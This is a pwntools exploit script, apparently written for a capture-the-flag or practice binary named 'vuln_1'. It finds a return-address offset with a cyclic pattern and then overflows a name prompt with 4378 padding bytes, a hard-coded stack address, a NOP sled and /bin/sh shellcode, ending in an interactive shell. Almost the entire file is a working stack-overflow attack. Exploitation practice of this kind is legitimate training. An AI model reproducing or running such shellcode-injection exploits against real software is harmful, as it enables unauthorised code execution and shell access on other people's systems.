#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
context(arch='amd64', os='linux')

exe = './vuln_1'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def find_rip_overwrite(io):
    # Display RIP overwrite offset
    payload = cyclic(5000)

    io.sendafter(b"Hey, whats your name!?\n", payload)
    io.sendafter(b"is this name correct? (y/n)?\n", b"y\n")

    io.wait()
    core = io.corefile
    stack = core.rsp
    info("rsp = %#x", stack)
    pattern = core.read(stack, 4)
    rip_offset = cyclic_find(pattern)

    log.info("rip offset is %d", rip_offset)

#===============================================================================
# Main Code
#===============================================================================

io = start()
shellcode = asm(shellcraft.amd64.linux.sh())
shellcode = b'\x90' * 100 + shellcode

#find_rip_overwrite(io)

# 4378
payload = b'A' * 4378 + p64(0x00007fffffffd010) + shellcode

io.sendafter(b"Hey, whats your name!?\n", payload)
io.sendafter(b"is this name correct? (y/n)?\n", b"y\n")
#io.wait()
#core = io.corefile
#stack = core.rsp
#info("rsp = %#x", stack)
#pattern = core.read(stack, 4)


#flag = io.recv(...)
#log.success(flag)

io.interactive()
